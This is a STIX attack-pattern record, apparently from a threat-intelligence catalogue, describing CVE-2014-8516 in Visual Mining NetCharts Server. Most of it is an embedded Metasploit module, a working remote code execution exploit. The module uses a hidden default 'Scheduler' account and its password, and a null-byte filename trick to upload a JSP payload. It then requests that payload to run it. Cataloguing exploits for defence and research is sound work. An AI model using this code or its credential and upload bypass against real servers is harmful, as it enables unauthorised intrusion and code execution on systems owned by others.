{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8ac037c1-3cfb-4956-999d-1d7c5fe55eeb",
    "created": "2024-08-14T17:11:36.038264Z",
    "modified": "2024-08-14T17:11:36.038268Z",
    "name": "Visual Mining NetCharts Server Remote Code Execution",
    "description": " This module exploits multiple vulnerabilities in Visual Mining NetCharts. First, a lack of input validation in the administration console permits arbitrary jsp code upload to locations accessible later through the web service. Authentication is typically required, however a 'hidden' user is available by default (and non-editable). This user, named 'Scheduler' can only login to the console after any modification in the user database (a user is added, admin password is changed etc). If the 'Scheduler' user isn't available valid credentials must be supplied. The default Admin password is Admin. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/visual_mining_netcharts_upload.rb",
            "external_id": "visual_mining_netcharts_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8516"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  DEFAULT_USERNAME = 'Scheduler'\n  DEFAULT_PASSWORD = '!@#$scheduler$#@!'\n  SIGNATURE = 'was uploaded successfully and is now ready for installation'\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Visual Mining NetCharts Server Remote Code Execution',\n      'Description' => %q{\n        This module exploits multiple vulnerabilities in Visual Mining NetCharts.\n        First, a lack of input validation in the administration console permits\n        arbitrary jsp code upload to locations accessible later through the web\n        service. Authentication is typically required, however a 'hidden' user is\n        available by default (and non-editable). This user, named 'Scheduler',\n        can only login to the console after any modification in the user\n        database (a user is added, admin password is changed etc). If the\n        'Scheduler' user isn't available valid credentials must be supplied. The\n        default Admin password is Admin.\n      },\n      'Author'       =>\n        [\n          'sghctoma',    # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-8516'],\n          ['ZDI', '14-372']\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ linux win },\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          ['Visual Mining NetCharts Server 7.0', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-11-03'))\n\n    register_options(\n      [\n        Opt::RPORT(8001),\n        OptString.new('HttpUsername', [false, \"The username to authenticate with\"]),\n        OptString.new('HttpPassword', [false, \"The password to authenticate with\"])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri('/', 'Admin', 'archive', 'upload.jsp'),\n      'vars_get' => { 'mode' => 'getZip' },\n      'authorization' => basic_auth(username, password)\n    })\n\n    if res && res.code == 200 && res.body && res.body.to_s.include?(SIGNATURE)\n      Exploit::CheckCode::Detected\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    jsp_payload = \"#{rand_text_alphanumeric(4 + rand(32-4))}.jsp\"\n    print_status(\"Uploading JSP payload #{jsp_payload}...\")\n    if upload(jsp_payload, payload.encoded)\n      print_good(\"JSP payload uploaded successfully\")\n      register_file_for_cleanup(\"./webapps/Admin/archive/ArchiveCache/#{jsp_payload}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - JSP payload upload failed\")\n    end\n\n    print_status(\"Executing payload...\")\n    execute(jsp_payload, 1)\n  end\n\n  def execute(jsp_name, time_out = 20)\n    res = send_request_cgi({\n      'uri'    => normalize_uri('/', 'Admin', 'archive', 'ArchiveCache', jsp_name),\n      'method' => 'GET',\n      'authorization' => basic_auth(username, password)\n    }, time_out)\n\n    res\n  end\n\n  def upload(file_name, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\n      contents,\n      'application/octet-stream',\n      nil,\n      \"form-data; name=\\\"FILE1\\\"; filename=\\\"#{file_name}\\x00Archive0101140101.zip\\\"\"\n    )\n\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"/\", 'Admin', 'archive', 'upload.jsp'),\n      'method' => 'GET',\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data'   => post_data.to_s,\n      'vars_get' => { 'mode' => 'getZip' },\n      'authorization' => basic_auth(username, password)\n    })\n\n    if res && res.code == 200 && res.body && res.body.to_s.include?(SIGNATURE)\n      true\n    else\n      false\n    end\n  end\n\n  def username\n    datastore['HttpUsername'].blank? ? DEFAULT_USERNAME : datastore['HttpUsername']\n  end\n\n  def password\n    datastore['HttpPassword'].blank? ? DEFAULT_PASSWORD : datastore['HttpPassword']\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-03",
    "x_mitre_platforms": [
        "%w{ linux win }"
    ]
}